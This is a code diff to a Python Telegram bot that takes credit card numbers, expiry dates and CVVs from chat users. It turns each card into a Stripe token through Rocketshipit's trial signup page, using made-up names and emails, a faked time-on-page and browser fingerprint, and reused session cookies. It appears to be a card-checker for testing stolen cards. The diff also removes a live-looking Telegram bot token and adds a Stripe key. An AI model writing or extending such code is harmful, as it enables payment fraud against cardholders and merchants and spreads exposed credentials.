@@ -10,7 +10,7 @@ import time
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Replace with your actual Telegram Bot Token
-BOT_TOKEN = "8072279299:AAHAEodRhWpDb2g7EIVNFc3pk1Yg0YlpaPc"
+BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # Rocketshipit Specific Information
@@ -20,7 +20,7 @@ PLAN_ID = "price_0OasfuftKVWrByuepaoLFVSB"  # From your example
 COUPON_CODE = ""  # You can modify this if needed
 
 # **CRITICAL: Replace with the ACTUAL Rocketshipit Stripe Publishable Key**
-STRIPE_PUBLIC_KEY = "YOUR_STRIPE_PUBLIC_KEY"
+STRIPE_PUBLIC_KEY = "pk_0BxZtv2UcRHjy0D3BO0jGVxdZKnqI"
 
 # Headers for Stripe API
 STRIPE_HEADERS = {
@@ -60,10 +60,7 @@ def generate_dynamic_email():
 def generate_dynamic_name():
     return f"Test User {generate_random_string(5).capitalize()}"
 
-def create_stripe_token(cc, mm, yy, cvv, name, email):
-    guid = "44447146-f191-4882-b384-e3f5e0470d45e7609d"
-    muid = ROCKETSHIPIT_COOKIES.get("__stripe_mid", "")
-    sid = ROCKETSHIPIT_COOKIES.get("__stripe_sid", "")
+def create_stripe_token(cc, mm, yy, cvv, name, email, guid, muid, sid):
     referrer = "https://www.rocketshipit.com/trial"
     time_on_page = random.randint(5000, 60000)  # Simulate time on page (milliseconds)
     payment_user_agent = "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; card-element"
@@ -130,8 +127,11 @@ def process_card(message):
 
         dynamic_email = generate_dynamic_email()
         dynamic_name = generate_dynamic_name()
+        guid = "44447146-f191-4882-b384-e3f5e0470d45e7609d"
+        muid = ROCKETSHIPIT_COOKIES.get("__stripe_mid", "")
+        sid = ROCKETSHIPIT_COOKIES.get("__stripe_sid", "")
 
-        stripe_token = create_stripe_token(cc, mm, yy, cvv, dynamic_name, dynamic_email)
+        stripe_token = create_stripe_token(cc, mm, yy, cvv, dynamic_name, dynamic_email, guid, muid, sid)
 
         if stripe_token:
             bot.reply_to(message, f"Stripe Token created: {stripe_token}. Submitting trial...")
